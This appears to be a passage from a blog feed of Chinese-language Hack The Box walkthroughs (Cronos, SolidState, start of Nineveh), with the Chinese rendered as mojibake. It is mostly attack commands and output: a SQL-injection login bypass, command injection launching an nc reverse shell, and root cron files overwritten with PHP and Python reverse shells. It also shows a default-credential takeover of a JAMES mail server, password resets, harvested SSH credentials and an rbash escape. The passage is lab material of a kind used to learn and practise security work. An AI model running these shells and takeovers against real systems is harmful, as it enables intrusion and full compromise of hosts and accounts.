36836/tcp filtered unknown 37062/tcp filtered unknown 41846/tcp filtered unknown 42917/tcp filtered unknown 45607/tcp filtered unknown 51186/tcp filtered unknown Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.8 - 3.11 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 368.17 ms 10.10.14.1 2 468.12 ms 10.10.10.13 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 87.93 seconds Http é»˜è®¤çš„ apache é¡µé¢ï¼Œfuzz é¡µé¢ä¹Ÿæ²¡æœ‰å¯ç”¨çš„ä¸œè¥¿ï¼Œå¯èƒ½åœ¨å­åŸŸå å­åŸŸååŠ ä¸€ä¸ª host è§£æ echo 10.10.10.13 cronos.htb &gt;&gt; /etc/hosts ç„¶åè·‘ä¸€ä¸ªå­åŸŸå â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ffuf -u &#39;http://cronos.htb/&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host:FUZZ.cronos.htb&#39; -fs 0,11439 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://cronos.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.cronos.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 0,11439 ________________________________________________ admin [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 5550ms] www [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 1331ms] fuzz å‡ºæœ‰ä¸€ä¸ª adminï¼Œç„¶åè¿™è¾¹æ˜¯åŠ ä¸Š host è§£æåï¼Œæœ‰äº†ä¸åŒçš„å˜åŒ– æŠŠè§£æå‡ºæ¥çš„å­åŸŸåç»™åŠ ä¸ª hosts è§£æ echo 10.10.10.13 admin.cronos.htb &gt;&gt; /etc/hosts è¿™è¾¹æœ‰ä¸€ä¸ªç™»é™†ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç  æ¼æ´åˆ©ç”¨ æµ‹è¯•äº†ä¸€ä¸‹å­˜åœ¨ sql æ³¨å…¥ï¼Œå¯ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½• ç™»å…¥åæœ‰ä¸€ä¸ª traceroute å’Œ ping åŠŸèƒ½ï¼Œå’Œ DVWA ç›¸ä¼¼å•Šï¼Œåº”è¯¥æ˜¯å¯ä»¥æ‹¼æ¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ å»å°è¯•ä¸€ä¸‹æ˜¯å¦å¯æ‰§è¡Œ ç¡®å®šå¯ä»¥æ‰§è¡Œå‘½ä»¤ ä½¿ç”¨ nc è¿›è¡Œç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 127.0.0.1|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f ä½¿ç”¨å¦‚ä¸Šè¯­å¥æ¥è¿›è¡Œåå¼¹ shel â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 57784 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸè·å¾—ä¸€ä¸ª shel www-data@cronos:/home/noulis$ cat user.txt cat user.txt acd300bee378d6a90aece189fc7ce7f6 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡â•”â•â•â•â•â•â•â•â•â•â•â•£ Cron jobs â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found -rw-r--r-- 1 root root 797 Apr 9 2017 /etc/crontab /etc/cron.d: total 24 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder -rw-r--r-- 1 root root 589 Jul 16 2014 mdadm -rw-r--r-- 1 root root 670 Mar 1 2016 php -rw-r--r-- 1 root root 191 Mar 22 2017 popularity-contest /etc/cron.daily: total 60 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder -rwxr-xr-x 1 root root 539 Apr 6 2016 apache2 -rwxr-xr-x 1 root root 376 Mar 31 2016 apport -rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat -rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils -rwxr-xr-x 1 root root 1597 Nov 27 2015 dpkg -rwxr-xr-x 1 root root 372 May 6 2015 logrotate -rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db -rwxr-xr-x 1 root root 539 Jul 16 2014 mdadm -rwxr-xr-x 1 root root 435 Nov 18 2014 mlocate -rwxr-xr-x 1 root root 249 Nov 13 2015 passwd -rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest -rwxr-xr-x 1 root root 214 May 24 2016 update-notifier-common /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder /etc/cron.weekly: total 24 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder -rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim -rwxr-xr-x 1 root root 771 Nov 6 2015 man-db -rwxr-xr-x 1 root root 211 May 24 2016 update-notifier-common SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) * * * * * root php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1 è¿™è¾¹çœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„ç¨‹åºè¿è¡Œåœ¨ root ä¸Š /var/www/laravel/artisan www-data@cronos:/var/www/laravel$ ls -la /var/www/laravel/artisan ls -la /var/www/laravel/artisan -rwxr-xr-x 1 www-data www-data 1646 Apr 9 2017 /var/www/laravel/artisan è¿™è¾¹æ˜¯å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ‹¥æœ‰å†™å…¥æƒé™ï¼Œçœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿ www-data@cronos:/var/www/laravel$ cat artisan cat artisan #!/usr/bin/env php &lt;?php /* |-------------------------------------------------------------------------- | Register The Auto Loader |-------------------------------------------------------------------------- | | Composer provides a convenient, automatically generated class loader | for our application. We just need to utilize it! We&#39;ll require it | into the script here so that we do not have to worry about the | loading of any our classes &quot;manually&quot;. Feels great to relax. | */ require __DIR__.&#39;/bootstrap/autoload.php&#39;; $app = require_once __DIR__.&#39;/bootstrap/app.php&#39;; /* |-------------------------------------------------------------------------- | Run The Artisan Application |-------------------------------------------------------------------------- | | When we run the console application, the current CLI command will be | executed in this console and the response sent back to a terminal | or another output device for the developers. Here goes nothing! | */ $kernel = $app-&gt;make(Illuminate\\Contracts\\Console\\Kernel::class); $status = $kernel-&gt;handle( $input = new Symfony\\Component\\Console\\Input\\ArgvInput, new Symfony\\Component\\Console\\Output\\ConsoleOutput ); /* |-------------------------------------------------------------------------- | Shutdown The Application |-------------------------------------------------------------------------- | | Once Artisan has finished running. We will fire off the shutdown events | so that any final work may be done by the application before we shut | down the process. This is the last thing to happen to the request. | */ $kernel-&gt;terminate($input, $status); exit($status); ä¼¼ä¹æ˜¯ä¸€ä¸ª php çš„è„šæœ¬ï¼Œå¹²å•¥çš„å’±å°±åˆ«ç®¡ä»–äº†ï¼Œå’±ä»¬å¯ä»¥å†™å…¥ä¸€ä¸ªç”¨ php åå¼¹ shell çš„è¯­å¥è¿›å»ï¼Œè¿›è¡Œåå¼¹ å†å¼€ä¸ª nc è¿›è¡Œä¸€ä¸ªå…¶ä»–ç«¯å£çš„ç›‘å¬ nc -nvlp 5555 echo &#39;&lt;?php $sock=fsockopen(&quot;10.10.14.4&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt;&#39; &gt; /var/www/laravel/artisan ç„¶åæ‰§è¡Œåï¼Œç­‰å¾…ä¸€ä¼šå„¿å°±è¡Œäº† â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 53042 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ # cat /root/root.txt 817402c7d13dc6ad8eff1f1af36d3382 æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"SolidState - Hackthebox","slug":"Hackthebox - SolidState","date":"2022-07-11T11:38:36.000Z","updated":"2023-05-20T03:09:59.000Z","comments":true,"path":"2022/07/11/Hackthebox - SolidState/","link":"","permalink":"http://www.lucifiel.com/2022/07/11/Hackthebox%20-%20SolidState/","excerpt":"","text":"Hackthebox - SolidStateé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 09:27 CST Nmap scan report for 10.10.10.51 Host is up (0.38s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.19 [10.10.14.19]), PIPELINING, ENHANCEDSTATUSCODES 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 JAMES pop3d 2.3.2 |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) 119/tcp open nntp? |_sslv2: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 4555/tcp open rsip? | fingerprint-strings: | GenericLines: | JAMES Remote Administration Tool 2.3.2 | Please enter your login and password | Login id: | Password: | Login failed for |_ Login id: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4555-TCP:V=7.92%I=7%D=7/11%Time=62CB7C97%P=aarch64-unknown-linux-gn SF:u%r(GenericLines,7C,&quot;JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\ SF:.2\\nPlease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\n SF:Password:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=7/11%OT=22%CT=1%CU=39286%PV=Y%DS=2%DC=T%G=Y%TM=62CB7DA OS:6%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=3%ISR=10F%TI=Z%CI=I%TS=8)SE OS:Q(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10F%TI=Z OS:%II=I%TS=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11 OS:NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71 OS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4 OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40 OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y OS:%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 461.02 ms 10.10.14.1 2 434.42 ms 10.10.10.51 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 304.88 seconds Http è¿™è¾¹æˆ‘ fuzz å’Œå¯»æ‰¾äº†ä¸€ä¸‹ï¼Œéƒ½æ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œå’±ä»¬æ¢ä¸ªæ€è·¯ 4555 ç«¯å£è¿™è¾¹æœ‰ä¸€ä¸ª 4555 ç«¯å£ï¼Œè¿™ç§å¼‚å¸¸ç«¯å£ä¸€çœ‹å°±ä¸å¯¹åŠ²ã€‚JAMES Remote Administration Tool 2.3.2ï¼Œè¿™è¾¹æ‰«æç«¯å£çš„æ—¶å€™æœ‰æç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼Œå»æœç´¢ä¸€ä¸‹ æ¼æ´åˆ©ç”¨å¾—çŸ¥äº†è¿™æ˜¯ä¸€ä¸ª pop3 åè®®çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œé»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯ rootï¼Œå»ä½¿ç”¨ telnet ç™»é™†ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# telnet 10.10.10.51 4555 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is &#39;^]&#39;. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands help Currently implemented commands: help display this help listusers display existing accounts countusers display the number of existing accounts adduser [username] [password] add a new user verify [username] verify if specified user exist deluser [username] delete existing user setpassword [username] [password] sets a user&#39;s password setalias [user] [alias] locally forwards all email for &#39;user&#39; to &#39;alias&#39; showalias [username] shows a user&#39;s current email alias unsetalias [user] unsets an alias for &#39;user&#39; setforwarding [username] [emailaddress] forwards a user&#39;s email to another email address showforwarding [username] shows a user&#39;s current email forwarding unsetforwarding [username] removes a forward user [repositoryname] change to another user repository shutdown kills the current JVM (convenient when James is run as a daemon) quit close connection ç™»é™†æˆåŠŸï¼Œå‘½ä»¤ä¸­æœ‰åˆ—è´¦å·çš„åŠŸèƒ½å’Œé‡ç½®å¯†ç çš„åŠŸèƒ½ï¼Œå»çœ‹ä¸€ä¸‹ Unknown command listusers Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin setpassword mindy admin Password for mindy reset å°†å¸æˆ· mindy çš„å¯†ç ç»™é‡ç½®äº†ï¼Œç„¶åå» 110 ç«¯å£ç™»é™†ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is &#39;^]&#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready user mindy +OK pass admin +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . retr 2 +OK Message follows Return-Path: &lt;mailadmin@localhost&gt; Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for &lt;mindy@localhost&gt;; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . Connection closed by foreign host. å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = mindy password = P@55W0rd1!2@ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ssh mindy@10.10.10.51 The authenticity of host &#39;10.10.10.51 (10.10.10.51)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.51&#39; (ED25519) to the list of known hosts. mindy@10.10.10.51&#39;s password: Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142 mindy@solidstate:~$ whoami&amp;&amp;id -rbash: whoami: command not found è¿›å»äº†ï¼Œä½†æ²¡å®Œå…¨è¿›å» mindy@solidstate:~$ cat user.txt 80d14d9b351c71c448bd5500e43c222e å¾—åˆ°äº† user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡rbash é€ƒé€¸mindy@solidstate:~$ cd -rbash: cd: restricted æ ¹æ®æƒ…å†µçœ‹ï¼Œè¿™æ˜¯ä¸€å°å—é™çš„ rbashï¼Œå»æƒ³åŠæ³•é€ƒé€¸ä¸€ä¸‹ https://xz.aliyun.com/t/7642 æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç«  ä½¿ç”¨äº†å…¶ä¸­ä¸€ä¸ªæŒ‡å®š bash çš„æ–¹æ³•æˆåŠŸé€ƒé€¸ ssh mindy@10.10.10.51 -t &quot;bash --noprofile&quot; æˆåŠŸé€ƒé€¸ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami&amp;&amp;id mindy uid=1001(mindy) gid=1001(mindy) groups=1001(mindy) RootæŸ¥çœ‹ä¸€ä¸‹å½“å‰è¿è¡Œçš„è¿›ç¨‹ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux|grep james root 556 0.0 0.0 2332 616 ? Ss Jul10 0:00 /bin/sh /opt/james-2.3.2/bin/run.sh root 575 0.1 3.7 854972 77232 ? Sl Jul10 0:19 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar mindy 23970 0.0 0.0 4736 800 pts/0 S+ 02:15 0:00 grep james å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ª sh ä¸€ç›´è¿è¡Œç€çš„ run.sh æ–‡ä»¶å»æŸ¥çœ‹ä¸‹æ˜¯å•¥ä¸œè¥¿ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/james-2.3.2/bin/run.sh #! /bin/sh # # ----------------------------------------------------------------------------- # Phoenix start script. # # OS specific support. $var _must_ be set to either true or false. cygwin=false case &quot;`uname`&quot; in CYGWIN*) cygwin=true;; esac # resolve links - $0 may be a softlink THIS_PROG=&quot;$0&quot; while [ -h &quot;$THIS_PROG&quot; ]; do ls=`ls -ld &quot;$THIS_PROG&quot;` link=`expr &quot;$ls&quot; : &#39;.*-&gt; \\(.*\\)$&#39;` if expr &quot;$link&quot; : &#39;.*/.*&#39; &gt; /dev/null; then THIS_PROG=&quot;$link&quot; else THIS_PROG=`dirname &quot;$THIS_PROG&quot;`/&quot;$link&quot; fi done # Get standard environment variables PRGDIR=`dirname &quot;$THIS_PROG&quot;` PHOENIX_HOME=`cd &quot;$PRGDIR/..&quot; ; pwd` unset THIS_PROG # For Cygwin, ensure paths are in UNIX format before anything is touched if $cygwin; then [ -n &quot;$PHOENIX_HOME&quot; ] &amp;&amp; PHOENIX_HOME=`cygpath --unix &quot;$PHOENIX_HOME&quot;` fi $PHOENIX_HOME/bin/phoenix.sh run $* æ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ ä½†æ˜¯å¯ä»¥ç¡®å®šçš„æ˜¯è‚¯å®šå’Œ opt ç›®å½•ä¸‹çš„ä¸œè¥¿æœ‰å…³ï¼Œå’±ä»¬å»çœ‹çœ‹ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la total 16 drwxr-xr-x 3 root root 4096 Aug 22 2017 . drwxr-xr-x 22 root root 4096 May 27 11:05 .. drwxr-xr-x 11 root root 4096 Apr 26 2021 james-2.3.2 -rwxrwxrwx 1 root root 105 Aug 22 2017 tmp.py è¿™è¾¹æœ‰ç‚¹å¼‚å¸¸ï¼Œåœ¨ &#x2F;opt ç›®å½•ä¸‹å‘ç°ä¸€ä¸ª tmp.py çš„æ–‡ä»¶ï¼Œæƒé™æ˜¯ 777 çš„ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py #!/usr/bin/env python import os import sys try: os.system(&#39;rm -r /tmp/* &#39;) except: sys.exit() è¿™è¾¹çœ‹ç€åƒæ˜¯ä¸ªå®æ—¶è¿è¡Œçš„è„šæœ¬ï¼Œå°è¯•å†™å…¥åå¼¹ shell çš„ä¸œè¥¿ echo &quot;import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 4444 &gt;/tmp/f&#39;)&quot; &gt; /opt/tmp.py ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.51] 37764 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸæ‹¿åˆ° root æƒé™ # cat /root/root.txt 096c5f57afdfe824d5827ea17af7756c æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Nineveh - Hackthebox","slug":"Hackthebox - Nineveh","date":"2022-07-08T11:38:36.000Z","updated":"2023-05-20T02:08:57.000Z","comments":true,"path":"2022/07/08/Hackthebox - Nineveh/","link":"","permalink":"http://www.lucifiel.com/2022/07/08/Hackthebox%20-%20Nineveh/","excerpt":"","text":"Hackthebox - Ninevehé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.43 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 09:06 CST Nmap scan report for 10.10.10.43 Host is up (0.35s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | tls-alpn: |_ http/1.1 |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 4.2 (91%), Linux 4.4 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 345.03 ms 10.10.14.1 2 343.72 ms 10.10.10.43 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.37 seconds Http Https http å’Œ https éƒ½æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¸œè¥¿ï¼Œè¿›è¡Œ fuzz çœ‹ä¸€ä¸‹ Fuzzâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ffuf -u &#39;http://10.10.10.43/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.43/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ server-status [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 341ms] [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 345ms] department [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 342ms] :: Progress: [30000/30000] :: Job [1/1] :: 289 req/sec :: Duration: [0:02:52] :: Errors: 59 :: â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ffuf -u &#39;https://10.10.10.43/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ 